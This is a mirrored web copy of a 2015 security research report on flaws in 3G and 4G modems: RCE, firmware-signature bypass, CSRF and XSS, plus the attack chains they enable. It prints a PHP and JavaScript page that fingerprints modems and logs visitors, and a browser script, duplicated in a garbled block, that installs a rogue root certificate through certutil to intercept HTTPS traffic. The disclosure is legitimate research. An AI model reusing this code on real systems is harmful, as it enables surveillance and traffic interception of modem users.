<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Critically dangerous vulnerabilities in popular 3G and 4G modems or how to build Big Brother</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="This report is a logical continuation of the ‚Äú #root via SMS ‚Äù study, completed in 2014 by the Strangelove SCADA team. The study touched upon the vuln...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Critically dangerous vulnerabilities in popular 3G and 4G modems or how to build Big Brother</h1><div class="post__text post__text-html js-mediator-article"> <a href="http://habrahabr.ru/company/pt/blog/272175/"><img src="https://habrastorage.org/files/0a0/f7d/773/0a0f7d7733cc47ef83184485ecfafcee.png"></a> <br><br>  This report is a logical continuation of the ‚Äú <a href="http://habrahabr.ru/company/pt/blog/243697/">#root via SMS</a> ‚Äù study, completed in 2014 by the Strangelove SCADA team.  The study touched upon the vulnerabilities of modems only partially, within the framework of a broader description of the vulnerabilities of equipment by telecom operators.  This document provides a description of all the found and used vulnerabilities in 8 popular models of 3G and 4G modems available in Russia and around the world.  The found vulnerabilities allow remote code execution in web scenarios (RCE), arbitrary modification of the firmware, cross-site request forgery (CSRF), and cross-site scripting (XSS). <br><br>  The study also describes the most comprehensive set of attack vectors for telecom clients using these modems ‚Äî this could be device identification, code injection, infection of the user‚Äôs computer to which the modem is connected, fake SIM card and data interception, subscriber location and access to it. personal account on the operator‚Äôs portal, as well as targeted attacks (APT).  Presentation slides from ZeroNights 2015 are presented <a href="http://www.slideshare.net/phdays/3g-4g">here</a> . <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  Equipment </h4><br>  8 modems of the following manufacturers were considered: <br><br><ul><li>  Huawei (2 different modems and 1 router), </li><li>  Gemtek (1 modem and 1 router), </li><li>  Quanta (2 modems), </li><li>  ZTE (1 modem). </li></ul><br>  Obviously, not all modems were supplied with vulnerable firmware: some of the vulnerabilities in the firmware were allowed during the customization of the firmware by the cellular operator.  Although such signatures suggest some thoughts: <br><br><img src="https://habrastorage.org/files/c59/0fd/aec/c590fdaecb0c461397e887a072dc5c6d.png"><br><br>  Further, for convenience, all network equipment - both modems and routers - will be called "modems". <br><br>  Statistics on vulnerable modems <br><br><table><tbody><tr><th>  Modem </th><th>  Total </th></tr><tr><td>  Gemtek1 </td><td>  1411 </td></tr><tr><td>  Quanta2, ZTE </td><td>  1250 </td></tr><tr><td>  Gemtek2 </td><td>  1409 </td></tr><tr><td>  Quanta1 </td><td>  946 </td></tr><tr><td>  Huawei </td><td>  - </td></tr></tbody></table><br>  Data was collected passively from the SecurityLab.ru portal from 01/29/2015 to 02/05/2015 (1 week).  The statistics does not provide information about Huawei modems, but they can always be found in shodan.io, for example like this: <br><br><img src="https://habrastorage.org/files/c4b/77b/f69/c4b77bf69dd040b3bfc72bb076d256b0.png"><br><br><blockquote><h4>  Vulnerabilities found </h4></blockquote><br>  In all the models considered there were some critical vulnerabilities that led to a complete compromise of the system.  Practically all of them could be operated remotely (see the general table for modems).  Description of found vulnerabilities, ranked by degree of danger: <br><br><h5>  1. Remote code execution in web scenarios, 5 devices (RCE) </h5><br>  All considered web servers on modems work on the basis of simple CGI scripts that almost never underwent proper filtering (except for Huawei modems, and then several updates after the announcement of vulnerabilities). <br><br>  And of course, all modems work with the file system: they need to send AT commands, read and write SMS, set up rules on the firewall, etc. <br><br>  In addition, almost no protection against attacks of the CSRF class was used anywhere, which made it possible to execute code remotely using social engineering methods and remotely sending requests through a malicious website.  For some modems, an XSS attack is possible. <br><br>  The combination of these three factors gives a disappointing result: more than 60% of modems are vulnerable to remote code execution.  Moreover, the updated firmware without this vulnerability can be obtained only for Huawei modems (there are public descriptions of vulnerabilities): the remaining vulnerabilities are still considered 0-days. <br><br><h5>  2. Arbitrary modification of the firmware, 6 devices (Integrity attacks) </h5><br>  Only three modems had the cryptographic protection of the firmware against modification.  The two modems operated using the same algorithm using the asymmetrically encrypted RSA in the digital signature mode of the SHA1 checksum, the third modem encrypted the contents of the firmware using the RC4 stream cipher. <br><br>  We managed to make attacks on all implementations of cryptoalgorithms that violate integrity and confidentiality: in the first case, we can modify the firmware by inserting arbitrary code into it, in the second case, due to the weakness of the algorithm, we managed to extract the key and determine the encryption algorithm, which also leads to the ability to arbitrarily change the contents of the firmware. <br><br>  Three more modems did not have protection against firmware modification; however, local firmware access is required to upgrade the firmware. <br><br>  The remaining two modems provided for the possibility of updating only through the operator's network using FOTA technology (Firmware Over-The-Air). <br><br><h5>  3. Cross-site request forgery, 5 devices (CSRF) </h5><br>  CSRF attacks can be used for different tasks, but primarily for remote downloading of modified firmware and introducing arbitrary code.  An effective defense against this attack is the use of unique tokens for each request. <br><br><h5>  4. Cross-site scripting, 4 devices (XSS) </h5><br>  The application surface of these attacks is also quite wide - from infecting a node to intercepting other people's SMS, but in our study their main application is also to download modified firmware, bypassing the antiCSRF and Same-Origin Policy checks. <br><br><blockquote><h4>  Attack vectors </h4></blockquote><br><h5>  1. Identification </h5><br>  To conduct a successful attack on a modem, it is necessary to identify it.  Of course, you can send all possible requests to exploit RCE vulnerabilities or try to download all possible firmware versions at all possible addresses, but this seems to be ineffective and may be noticeable to the attacked user.  In addition, in real, non-laboratory conditions that are considered in this study, the time of infection is quite important - from the moment a user is found to the moment the code is inserted, the modem settings are changed. <br><br>  That is why at the initial stage it is necessary to correctly identify the attacked device.  To do this, use a simple set of image addresses, the presence of which indicates a particular version of the modem.  Thus, we were able to determine all the modems in question with 100% accuracy.  Sample code below: <br><br><pre><code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $type = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_GET[<span class="hljs-string"><span class="hljs-string">'type'</span></span>]==<span class="hljs-string"><span class="hljs-string">'1'</span></span>) { $type = <span class="hljs-number"><span class="hljs-number">1</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> ($_GET[<span class="hljs-string"><span class="hljs-string">'type'</span></span>]==<span class="hljs-string"><span class="hljs-string">'2'</span></span>) { $type = <span class="hljs-number"><span class="hljs-number">2</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> ($_GET[<span class="hljs-string"><span class="hljs-string">'type'</span></span>]==<span class="hljs-string"><span class="hljs-string">'3'</span></span>) { $type = <span class="hljs-number"><span class="hljs-number">3</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> ($_GET[<span class="hljs-string"><span class="hljs-string">'type'</span></span>]==<span class="hljs-string"><span class="hljs-string">'4'</span></span>) { $type = <span class="hljs-number"><span class="hljs-number">4</span></span>; } file_put_contents(<span class="hljs-string"><span class="hljs-string">"./log_31337.txt"</span></span>, ($type&gt;<span class="hljs-number"><span class="hljs-number">0</span></span>?<span class="hljs-string"><span class="hljs-string">"2("</span></span>.$type.<span class="hljs-string"><span class="hljs-string">"):\t"</span></span>:<span class="hljs-string"><span class="hljs-string">"1:\t"</span></span>). $_SERVER[<span class="hljs-string"><span class="hljs-string">'REMOTE_ADDR'</span></span>].$_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_CLIENT_IP'</span></span>].<span class="hljs-string"><span class="hljs-string">' '</span></span>.$_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span></span>].<span class="hljs-string"><span class="hljs-string">"\t"</span></span>. date(<span class="hljs-string"><span class="hljs-string">"Ymd H:i:s"</span></span>).<span class="hljs-string"><span class="hljs-string">"\t"</span></span>.time().<span class="hljs-string"><span class="hljs-string">"\t"</span></span>. $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_USER_AGENT'</span></span>].<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>, FILE_APPEND); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span> &lt;script&gt; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">createxmlHttpRequestObject</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> xmlHttp; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (window.ActiveXObject) { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { xmlHttp = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ActiveXObject(<span class="hljs-string"><span class="hljs-string">"Microsoft.XMLHTTP"</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(e) { xmlHttp = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { xmlHttp = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> XMLHttpRequest(); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(e) { xmlHttp = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!xmlHttp) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> xmlHttp;} } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HandleServerResponse</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (xmlHttp.readyState == <span class="hljs-number"><span class="hljs-number">4</span></span>) { } } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> xmlHttp = createxmlHttpRequestObject(); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">set</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(type)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (xmlHttp.readyState == <span class="hljs-number"><span class="hljs-number">4</span></span> || xmlHttp.readyState == <span class="hljs-number"><span class="hljs-number">0</span></span>) { xmlHttp.open(<span class="hljs-string"><span class="hljs-string">'GET'</span></span>, <span class="hljs-string"><span class="hljs-string">'?type='</span></span>+type, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); xmlHttp.onreadystatechange = HandleServerResponse; xmlHttp.send(<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { setTimeout(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{set(type)},<span class="hljs-number"><span class="hljs-number">1000</span></span>); } } &lt;/script&gt; &lt;img src=<span class="hljs-string"><span class="hljs-string">"http:// 192.168.0.1/img/1.png"</span></span> style=<span class="hljs-string"><span class="hljs-string">"height:0;width:0;"</span></span> onload=<span class="hljs-string"><span class="hljs-string">"set('1')"</span></span>&gt; &lt;img src=<span class="hljs-string"><span class="hljs-string">"http://192.168.0.1/img/2.jpg"</span></span> style=<span class="hljs-string"><span class="hljs-string">"height:0;width:0;"</span></span> onload=<span class="hljs-string"><span class="hljs-string">"set('2')"</span></span>&gt; &lt;img src=<span class="hljs-string"><span class="hljs-string">"http://hostname/img/3.png"</span></span> style=<span class="hljs-string"><span class="hljs-string">"height:0;width:0;"</span></span> onload=<span class="hljs-string"><span class="hljs-string">"set('3')"</span></span>&gt; &lt;img src=<span class="hljs-string"><span class="hljs-string">"http:// 192.168.0.1/img/4.gif"</span></span> style=<span class="hljs-string"><span class="hljs-string">"height:0;width:0;"</span></span> onload=<span class="hljs-string"><span class="hljs-string">"set('4')"</span></span>&gt;</code> </pre> <br><h5>  2. Code implementation </h5><br>  This stage has already been described in detail in the previous section, in paragraphs 1 and 2. You can embed code either through the vulnerability of executing arbitrary code in web scripts, or through an update to infected firmware.  The first way we were able to penetrate 5 modems. <br><br>  We describe in detail the vectors for the implementation of the second method. <br><br>  The two modems used the same algorithm to ensure the integrity of the firmware: encrypting with the asymmetric RSA key the SHA1 hash sum was performed using the openssl library.  The check was conducted incorrectly: having downloaded the firmware, which is essentially an archive, the web server extracted two main files from it - a file indicating the size of the data being checked, and a file with a signed hash sum of this data.  Then, taking the public key from the file system, the verification script accessed the openssl library functions to decrypt the signature and then compared the hash sums, and in case of coincidence, the firmware was installed.  The firmware compression algorithm had a peculiarity: it was possible to add additional files with the same names to the existing archive, while the initial bytes of the archive would not change, and when unpacking the firmware, the later file was replaced with an earlier file.  Thanks to this, it is very easy to change the contents of the firmware without altering the integrity of the data being checked. <br><br><img src="https://habrastorage.org/files/7c4/7f6/1b6/7c47f61b66a647789a5c0f9680076cfc.png"><br><br>  In the third modem, the firmware was encrypted using the RC4 algorithm with a constant gamma.  Since there were three different versions of this firmware available on the Internet, you can get several plain-text bytes - in places where 0x00 bytes are located in one of the files of the unencrypted firmware. <br><br><img src="https://habrastorage.org/files/c4c/f7d/c8b/c4cf7dc8bbee41e3bf1a5ed322a0bf41.png"><br><br>  Further extraction of the ISO image of the virtual CD-ROM made it possible to extract a partially binary file with the encryption algorithm of the firmware images and the address where the encryption key was located.  A further XOR of two firmware made it possible to get plain-text exactly at the address of the encryption key and successfully extract it. <br><br><blockquote>  <b>Support and assistance in attacks on cryptoprotocols provided by Dmitry Sklyarov, honored cryptanalyst and reverse engineer from Positive Technologies</b> </blockquote><br>  In the future, for remote download, you can use the CSRF attack and HTML5 functions to send multipart / form-data or XSS attack if the application is protected from CSRF (for the Huawei modem).  Only three Huawei modems were protected from CSRF, and it was in them that XSS could be exploited to circumvent this protection.  In all other cases, the download could be carried out using the HTML5-code located on a special page. <br><br>  In Gemtek modems, the firmware update algorithm was used through a special utility installed on the computer.  In this case, the firmware was downloaded via an Internet connection on the host using the HTTP protocol.  But then the mechanism used to control the integrity of the downloaded firmware using checksums, also downloaded from the server.  Check the correctness of this script failed. <br><br>  However, it is not worthwhile to hope that the same manufacturer, which incorrectly checks the integrity when loading on modems, protects the integrity of the firmware well. <br><br><h5>  3. Interception </h5><br>  Now we have the ability to execute arbitrary code on the modem.  Next, you need to do three things: determine the location of the modem (later it will be clear why), to be able to intercept SMS and HTTP traffic. <br><br><img src="https://habrastorage.org/files/c9d/1b7/f67/c9d1b7f672c4492f87c727f745846593.png"><br><br>  The easiest way to determine the location is to find the base station identifier (CellID).  Then, knowing the operator's MCC and MNC, one can quite accurately determine the position of the <a href="http://opencellid.org/">person</a> being attacked using public databases like <a href="http://opencellid.org/">opencellid.org</a> .  Another way is to use the Wi-Fi card built into the modem in order to scan the nearby networks to also determine the location of the victim (or to determine the zone of his possible location, because one base station can work on a sufficiently large coverage radius).  CellID we managed to ‚Äúget‚Äù in 6 modems, Wi-Fi was available in two modems.  For one of the modems, we had to recompile and load new drivers for the network card: the current ones allowed it to work only in ad hoc mode, and in this mode it is impossible to scan nearby access points. <br><br><img src="https://habrastorage.org/files/669/8bb/0e5/6698bb0e58aa4cacb77244c32dd89e52.png"><br><br>  The considered modems were of two types - supporting the work with SMS and not supporting.  At first, it was also not possible to detect the possibility of reading SMS via AT commands.  In the second, it is possible to read using cross-site scripting.  SMS are usually stored on the file system, so it is easy to access them to read as well as send SMS and USSD requests. <br><br>  Intercepting traffic is a more interesting thing.  It can be implemented in several ways: by changing the settings of the DNS server on the modem, as well as by changing the gateway on the modem to a Wi-Fi interface and connecting to a pre-activated access point.  The first way, of course, is simpler; changing the settings is a matter for 10 seconds: they, as a rule, are also on the file system;  everywhere except one modem, it succeeded.  The second option was considered purely theoretically: the task was to change the network card's mode from ad hoc to active, connect to an external access point, and also change the routing on the modem. <br><br>  We can intercept not only HTTP traffic.  By simply embedding and executing VBS code in an HTML page, you can add your certificate to trusted root certification authorities and successfully run the MITM: <br><br><pre> <code class="vbscript hljs">&lt;script&gt; <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> writeFileInIE(filePath, fileContent) { try { var fso = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ActiveXObject(<span class="hljs-string"><span class="hljs-string">"Scripting.FileSystemObject"</span></span>); var file = fso.OpenTextFile(filePath, <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-literal"><span class="hljs-literal">true</span></span>); file.WriteLine(fileContent); file.Close(); } catch (e) { } } writeFileInIE(<span class="hljs-string"><span class="hljs-string">"c:/1.crt"</span></span>, <span class="hljs-string"><span class="hljs-string">"-----BEGIN CERTIFICATE-----MIICxDCCAi2gAwIBAgIEVbtqxDANBgkqhkiG9w0BAQUFADCBijEUMBIGA1UEBhMLUG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0U3dpZ2dlcjEUMBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2lnZ2VyIENBMRcwFQYDVQQDEw5Qb3J0U3dpZ2dlciBDQTAeFw0xNTA3MzExMjMyMDRaFw0zNTA3MjYxMjMyMDRaMIGKMRQwEgYDVQQGEwtQb3J0U3dpZ2dlcjEUMBIGA1UECBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ2VyMRQwEgYDVQQKEwtQb3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNVBAMTDlBvcnRTd2lnZ2VyIENBMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCMW4CYC94Y+hcSowE7Ea4l5hUkycKNi3XW/5GAq+xM+k8YVAEiREGlAly6AzFFjyNngMYiOU8boB2Gv9sRJ7yii+eNT9Dh8plnZdfteCJQqzQrwuwhBag7pdm0zisyjfzWIUQ+FEWMYcBvGqXW85+YqSycQNSZwhh18oiTx1Gq+QIDAQABozUwMzASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBR24qD42rjplUYYgjbHPInk+QoO3TANBgkqhkiG9w0BAQUFAAOBgQADWcc9RaFvD/trGoeWf5aZHrmtVUjiV9v8qY+Aoed13JpWOfhcpRpEMKeXDA+sm+iylsrq79B770XhLii9Yz2MyoyQ2jRiyTRth17eXr9w7KHnoTeAFgY9STConiqCpBrdZY+h7mXyIq3KzzWQuHuFRt6lL2oSaM/ZEK+KB3ImwA==-----END CERTIFICATE-----"</span></span>); a=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ActiveXObject(<span class="hljs-string"><span class="hljs-string">"WScript.Shell"</span></span>); a.run(<span class="hljs-string"><span class="hljs-string">"certutil -addstore -f Root c:/1.crt"</span></span>); &lt;/script&gt;</code> "----- BEGIN CERTIFICATE ----- MIICxDCCAi2gAwIBAgIEVbtqxDANBgkqhkiG9w0BAQUFADCBijEUMBIGA1UEBhMLUG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0U3dpZ2dlcjEUMBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2lnZ2VyIENBMRcwFQYDVQQDEw5Qb3J0U3dpZ2dlciBDQTAeFw0xNTA3MzExMjMyMDRaFw0zNTA3MjYxMjMyMDRaMIGKMRQwEgYDVQQGEwtQb3J0U3dpZ2dlcjEUMBIGA1UECBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ2VyMRQwEgYDVQQKEwtQb3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNVBAMTDlBvcnRTd2lnZ2VyIENBMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCMW4CYC94Y + hcSowE7Ea4l5hUkycKNi3XW / 5GAq + xM + k8YVAEiREGlAly6AzFFjyNngMYiOU8boB2Gv9sRJ7yii + eNT9Dh8plnZdfteCJQqzQrwuwhBag7pdm0zisyjfzWIUQ + FEWMYcBvGqXW85 + YqSycQNSZwhh18oiTx1Gq + QIDAQABozUwMzASBgNVHRMBAf8ECDAGAQH / AgEAMB0GA1UdDgQWBBR24qD42rjplUYYgjbHPInk + QoO3TANBgkqhkiG9w0BAQUFAAOBgQADWcc9RaFvD / trGoeWf5aZHrmtVUjiV9v8qY + Aoed13JpWOfhcpRpEMKeXDA + <code class="vbscript hljs">&lt;script&gt; <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> writeFileInIE(filePath, fileContent) { try { var fso = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ActiveXObject(<span class="hljs-string"><span class="hljs-string">"Scripting.FileSystemObject"</span></span>); var file = fso.OpenTextFile(filePath, <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-literal"><span class="hljs-literal">true</span></span>); file.WriteLine(fileContent); file.Close(); } catch (e) { } } writeFileInIE(<span class="hljs-string"><span class="hljs-string">"c:/1.crt"</span></span>, <span class="hljs-string"><span class="hljs-string">"-----BEGIN CERTIFICATE-----MIICxDCCAi2gAwIBAgIEVbtqxDANBgkqhkiG9w0BAQUFADCBijEUMBIGA1UEBhMLUG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0U3dpZ2dlcjEUMBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2lnZ2VyIENBMRcwFQYDVQQDEw5Qb3J0U3dpZ2dlciBDQTAeFw0xNTA3MzExMjMyMDRaFw0zNTA3MjYxMjMyMDRaMIGKMRQwEgYDVQQGEwtQb3J0U3dpZ2dlcjEUMBIGA1UECBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ2VyMRQwEgYDVQQKEwtQb3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNVBAMTDlBvcnRTd2lnZ2VyIENBMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCMW4CYC94Y+hcSowE7Ea4l5hUkycKNi3XW/5GAq+xM+k8YVAEiREGlAly6AzFFjyNngMYiOU8boB2Gv9sRJ7yii+eNT9Dh8plnZdfteCJQqzQrwuwhBag7pdm0zisyjfzWIUQ+FEWMYcBvGqXW85+YqSycQNSZwhh18oiTx1Gq+QIDAQABozUwMzASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBR24qD42rjplUYYgjbHPInk+QoO3TANBgkqhkiG9w0BAQUFAAOBgQADWcc9RaFvD/trGoeWf5aZHrmtVUjiV9v8qY+Aoed13JpWOfhcpRpEMKeXDA+sm+iylsrq79B770XhLii9Yz2MyoyQ2jRiyTRth17eXr9w7KHnoTeAFgY9STConiqCpBrdZY+h7mXyIq3KzzWQuHuFRt6lL2oSaM/ZEK+KB3ImwA==-----END CERTIFICATE-----"</span></span>); a=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ActiveXObject(<span class="hljs-string"><span class="hljs-string">"WScript.Shell"</span></span>); a.run(<span class="hljs-string"><span class="hljs-string">"certutil -addstore -f Root c:/1.crt"</span></span>); &lt;/script&gt;</code> </pre><br><h5>  4. SIM fake and interception of 2G traffic </h5><br>  Details on how to attack applications on the SIM-card are described in the works of Karsten Nohl, as well as in the study "#root via SMS".  We still need to send binary SMS to SIM cards, since we failed to teach the modem to send commands via the APDU protocol to applications on the SIM card. <br><br>  However, not everything is so sad: thanks to the introduction of arbitrary code on the modem, it is possible to extend the scop-attacks with the help of binary SMS.  Firstly, now binary SMS can be sent ‚Äúto oneself‚Äù - from the attacked SIM card to it via the AT interface.  To do this, switch the modem to the diagnostic mode and work with the COM port.  This can be done in the background: the web interface will still be accessible to the attacker and the mode switching process is almost imperceptible.  Next, you need to communicate with the COM port.  This can be done by implementing the VBS-code on the modem page and executing this code with user rights, applying social engineering. <br><br><img src="https://habrastorage.org/files/2f3/a4e/39f/2f3a4e39fada42d3a093486e84e5a6ff.png"><br><br>  <i>We transfer the modem to the diagnostic mode</i> <br><br><img src="https://habrastorage.org/files/5fe/dd7/bdd/5fedd7bdd7a74bc8bba8dcfeff8ddf27.png"><br><br>  <i>PowerShell script to send binary SMS</i> <br><br>  The next attack vector that can be used in combination with the exact geolocation of the attacker is the use of FakeBTS.  If we know the exact location of the victim, as well as his IMSI, we can use the fake base station in close proximity and wait for him to connect to us, or, if we can, force the base station (this feature is available for 5 devices).  If successful, you can send binary SMS to the attacked SIM card without restrictions from the operator. <br><br><h5>  5. Infection of workstations </h5><br>  Having infiltrated the modem, we are limited in the vectors of attacks on the telecom subscriber, but if we infect the computer to which the modem is connected, then we immediately get unlimited possibilities for theft and interception of data within this computer. <br><br>  Previously described the main infection vector - bad USB.  However, if you use the methods of social engineering, several more options are possible: <br><br><ul><li>  Virtual CD-ROM.  Almost all modems have an image of a virtual disk, which is connected at the first stage to install drivers.  It is necessary to replace this image and force it to be mounted. </li><li>  VBS, drive-by-download.  Implementing the executable code in the body of the HTML page or forcing the download of executable files under the guise of "updates" or diagnostic utilities. </li><li>  Browser 0-days.  The example used was Adobe Flash 0-day, found in the archives of the Hacking Team. </li><li>  Vulnerable client software.  One of the operators supplied vulnerable diagnostic software with the modem, which allows to execute arbitrary code on a computer running OS X and Windows.  Reference: for finding this vulnerability special thanks to Michael Firstov from HeadLight Security. </li></ul><br><img src="https://habrastorage.org/files/ca7/0e6/840/ca70e684070c401a8453b5846747df0c.png"><br><br>  <i>Execution of arbitrary code on modem client software</i> <br><br><h5>  6. Target attacks (APT) </h5><br>  Having infected the modem and the host, you need to somehow gain a foothold in the systems.  In the modem, it is necessary to remain in autoload even after turning off the modem and to prevent further firmware updates.  In an infected computer, it is useful to identify and infect other vulnerable modems as soon as they are connected to the computer.  In addition, most devices can be infected directly in the communication salon, in the process of "checking" the device. <br><br>  Another possibility that, unfortunately, could not be realized, is access to the modem from the operator‚Äôs network.  Since most of the vulnerable web servers listen to *: 80, there is a possibility that the modem's web server will be accessible from the operator‚Äôs network, however, this feature was not very relevant.  Although, only some modems forcibly prohibit incoming connections from the operator‚Äôs network or specifically specify the address for listen 192.168.0.1:80. <br><br><h5>  7. Optional </h5><br>  The vector of access to the operator‚Äôs personal account was also considered by sending a request via USSD and resetting the password via SMS. <br>  This vector was shown at the ‚Äú#root via SMS‚Äù presentation.  For operation, an XSS attack was used, which could be implemented by sending SMS.  However, this is also possible in those modems where reading SMS via RCE is available. <br><br><img src="https://habrastorage.org/files/33c/c1c/45e/33cc1c45e6b6414abc515121c09b5944.png"><br><br>  <i>XSS operation result</i> <br><br><h4>  Summary </h4><br>  As a result, we have a full cycle of infection of the devices and computers into which they are connected.  On infected devices, we can detect geolocation, intercept and send SMS and USSD, read HTTP and HTTPS traffic (in case of SSL certificate substitution), carry out attacks on SIM cards via binary SMS and intercept 2G traffic.  Further distribution is possible through the operator's network, infection through popular web resources or using the worm-virus method through the already infected equipment when an uninfected user is connected. <br><br>  What advise customers who constantly work with such devices?  The most secure today are Huawei modems, provided that the latest firmware version is installed.  This is the only company that supplies the firmware itself (operators are only given the opportunity to add visual elements and disable one or another set of functions).  In addition, unlike others, Huawei regularly fixes vulnerabilities found in its software. <br><br>  <b>Modems:</b> <br><br><img 